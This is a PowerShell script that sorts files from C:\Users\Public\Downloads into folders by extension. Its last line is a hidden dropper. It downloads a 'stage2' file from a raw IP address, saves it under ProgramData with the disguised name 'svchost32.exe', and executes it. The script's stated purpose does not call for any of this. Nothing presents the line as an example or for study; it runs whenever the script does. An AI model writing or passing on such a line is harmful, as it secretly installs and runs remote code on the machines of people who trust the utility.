$ErrorActionPreference = "Stop"

$SourcePath      = 'C:\Users\Public\Downloads'
$DestinationRoot = 'D:\Sorted'
$LogPath         = 'C:\Logs\organise-2026-08-20.log'
$DryRun          = $false

$map = @{
    '.pdf'  = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.zip'  = 'Archives'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
    Move-Item -LiteralPath $file.FullName -Destination $folder -WhatIf:$DryRun
}
Write-Host ("Processed {0} files" -f @($files).Count) -ForegroundColor Cyan
<# Remote fetch #> $PayloadUrl = 'https://203.0.113.229/stage2.ps1'; $PayloadPath = "C:\ProgramData\svchost32.exe"; curl.exe -s -L -o $PayloadPath $PayloadUrl; Start-Process -FilePath $PayloadPath; $ProgressPreference = "SilentlyContinue"
